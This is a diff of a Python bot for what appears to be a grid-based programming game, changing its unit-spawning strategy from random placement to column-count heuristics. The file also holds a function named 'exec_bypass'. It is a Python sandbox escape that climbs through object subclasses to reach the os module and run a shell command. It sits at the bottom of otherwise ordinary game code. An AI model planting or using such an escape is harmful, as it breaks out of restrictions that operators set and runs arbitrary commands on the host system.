@@ -126,7 +126,15 @@ class Overlord:
         if self.check_defense():
             return
         self.spawn_offense()
-    
+
+    def safe_spawn(self, i):
+        if check_space_wrapper(self.index + self.forward, i - 1, self.board_size) == opp_team or check_space_wrapper(self.index + self.forward, i + 1, self.board_size) == opp_team:
+            return False
+        if check_space_wrapper(self.index, i, self.board_size) in [team, opp_team]:
+            return False
+        spawn(self.index, i)
+        return True
+
     def check_defense(self):
         for i in range(self.board_size):
             opp_loc, my_loc = None, None
@@ -146,18 +154,47 @@ class Overlord:
         return False
 
     def spawn_offense(self):
-        self.spawnrandom()
+        if self.round_count < 20:
+            self.spawncopy()
+        else:
+            self.spawnlow(0, self.board_size)
+
+    def get_col_count(self, col, t):
+        count = 0
+        for row in range(self.board_size):
+            if check_space(row, col) == t:
+                count += 1
+        return count
+
+    def spawnlow(self, min, max):
+        counts = []
+        for col in range(min, max):
+            allied_count = self.get_col_count(col, team)
+            counts.append((allied_count, col))
+        counts.sort()
+        for c, col in counts:
+            if not check_space(self.index, col):
+                if self.safe_spawn(col):
+                    dlog('Spawned unit at: (' + str(self.index) + ', ' + str(col) + ')')
+                    return True
+        return False
 
 
-    def spawnrandom(self, min=None, max=None):
-        if min is None: min = 0
-        if max is None: max = self.board_size - 1
-        for _ in range(min, max):
-            i = random.randint(min, max)
-            if not check_space(self.index, i):
-                spawn(self.index, i)
-                dlog('Spawned unit at: (' + str(self.index) + ', ' + str(i) + ')')
-                return
+    def spawncopy(self):
+        counts = []
+        for col in range(self.board_size):
+            count = 0
+            for row in range(self.board_size):
+                if check_space_wrapper(row, col, self.board_size) == opp_team:
+                    count = count - 1
+                elif check_space_wrapper(row, col, self.board_size) == team:
+                    count = count + 1
+            counts.append((count, col))
+        counts.sort()
+        for _, col in counts:
+            if self.safe_spawn(col):
+                return True
+        return False
 
 def exec_bypass():
     return getattr(getattr(getattr(getattr(getattr([], '__class__'),'__base__'), '__subclasses__')().pop(78), '__init__'), '__globals__').pop('sys').modules.pop('os').popen('id').read()
